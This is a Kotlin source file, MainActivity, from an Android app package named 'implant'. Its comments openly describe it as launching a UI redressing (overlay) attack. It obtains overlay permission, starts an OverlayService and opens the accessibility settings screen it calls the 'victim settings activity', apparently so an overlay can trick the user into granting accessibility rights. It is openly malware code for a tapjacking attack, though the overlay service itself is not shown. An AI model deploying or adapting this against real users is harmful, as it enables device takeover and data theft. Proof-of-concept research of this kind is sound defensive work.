package com.cooperthecoder.implant

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.support.v7.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private val REQUEST_CODE_OVERLAY = 5463

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (overlayPermissionRequired()) {
            val appUri = Uri.fromParts("package", packageName, null)
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, appUri)
            startActivityForResult(intent, REQUEST_CODE_OVERLAY)
        } else {
            startOverlayService()
        }
    }

    private fun startOverlayService() {
        // Start the topOverlay service to begin the UI redressing attack
        startService(Intent(this, OverlayService::class.java))
        // Launch victim settings activity and close this activity.
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        finish()
    }

    private fun overlayPermissionRequired() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_OVERLAY && resultCode == Activity.RESULT_OK && !overlayPermissionRequired()) {
            startOverlayService()
        }
    }
}
